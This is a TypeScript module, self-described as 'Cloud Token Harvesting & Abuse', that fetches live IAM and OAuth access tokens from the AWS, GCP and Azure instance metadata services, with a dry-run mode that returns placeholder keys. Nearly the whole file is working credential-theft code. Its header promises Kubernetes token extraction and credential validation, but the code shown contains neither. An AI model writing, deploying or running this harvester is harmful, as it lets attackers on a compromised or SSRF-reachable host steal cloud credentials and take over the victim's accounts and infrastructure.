/**
 * @module cloud_token
 * Cloud Token Harvesting & Abuse — AWS IMDSv1/v2, GCP Metadata Server, Azure IMDS,
 * Kubernetes Service Account Token extraction, and credential validation.
 */

// ─── Types ────────────────────────────────────────────────────────────────────

export interface CloudCredential {
  provider: "aws" | "gcp" | "azure" | "kubernetes";
  accessKeyId?: string;
  secretAccessKey?: string;
  sessionToken?: string;
  token?: string;
  expiration?: string;
  rawResponse: Record<string, unknown>;
}

export interface CloudTokenOptions {
  live?: boolean;
  timeoutMs?: number;
}

// ─── AWS IMDS ─────────────────────────────────────────────────────────────────

export async function fetchAWSMetadata(opts: CloudTokenOptions = {}): Promise<CloudCredential | null> {
  const { live = false, timeoutMs = 2000 } = opts;

  if (!live) {
    return {
      provider: "aws",
      accessKeyId: "ASIAIOSFODNN7EXAMPLE",
      secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      sessionToken: "IQoJb3JpZ2luX2VjEEXAMPLE...",
      expiration: new Date(Date.now() + 3600 * 1000).toISOString(),
      rawResponse: { dryRun: true },
    };
  }

  try {
    // IMDSv2 Token Request
    const tokenResp = await fetch("http://169.254.169.254/latest/api/token", {
      method: "PUT",
      headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
      signal: AbortSignal.timeout(timeoutMs),
    });
    const imdsToken = tokenResp.ok ? await tokenResp.text() : "";

    const headers: Record<string, string> = imdsToken ? { "X-aws-ec2-metadata-token": imdsToken } : {};

    // Get assigned IAM role name
    const roleResp = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
      headers,
      signal: AbortSignal.timeout(timeoutMs),
    });
    if (!roleResp.ok) return null;
    const roleName = (await roleResp.text()).trim();

    // Get security credentials
    const credResp = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`, {
      headers,
      signal: AbortSignal.timeout(timeoutMs),
    });
    if (!credResp.ok) return null;

    const data = (await credResp.json()) as Record<string, string>;
    return {
      provider: "aws",
      accessKeyId: data["AccessKeyId"],
      secretAccessKey: data["SecretAccessKey"],
      sessionToken: data["Token"],
      expiration: data["Expiration"],
      rawResponse: data,
    };
  } catch {
    return null;
  }
}

// ─── GCP Metadata ─────────────────────────────────────────────────────────────

export async function fetchGCPMetadata(opts: CloudTokenOptions = {}): Promise<CloudCredential | null> {
  const { live = false, timeoutMs = 2000 } = opts;

  if (!live) {
    return {
      provider: "gcp",
      token: "ya29.a0ARrdaM...DRY_RUN",
      expiration: new Date(Date.now() + 3600 * 1000).toISOString(),
      rawResponse: { dryRun: true },
    };
  }

  try {
    const resp = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
      headers: { "Metadata-Flavor": "Google" },
      signal: AbortSignal.timeout(timeoutMs),
    });
    if (!resp.ok) return null;
    const data = (await resp.json()) as Record<string, unknown>;
    return {
      provider: "gcp",
      token: String(data["access_token"]),
      expiration: new Date(Date.now() + Number(data["expires_in"]) * 1000).toISOString(),
      rawResponse: data,
    };
  } catch {
    return null;
  }
}

// ─── Azure IMDS ───────────────────────────────────────────────────────────────

export async function fetchAzureMetadata(opts: CloudTokenOptions = {}): Promise<CloudCredential | null> {
  const { live = false, timeoutMs = 2000 } = opts;

  if (!live) {
    return {
      provider: "azure",
      token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...DRY_RUN",
      rawResponse: { dryRun: true },
    };
  }

  try {
    const resp = await fetch("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {
      headers: { Metadata: "true" },
      signal: AbortSignal.timeout(timeoutMs),
    });
    if (!resp.ok) return null;
    const data = (await resp.json()) as Record<string, unknown>;
    return {
      provider: "azure",
      token: String(data["access_token"]),
      rawResponse: data,
    };
  } catch {
    return null;
  }
}

export default { fetchAWSMetadata, fetchGCPMetadata, fetchAzureMetadata };
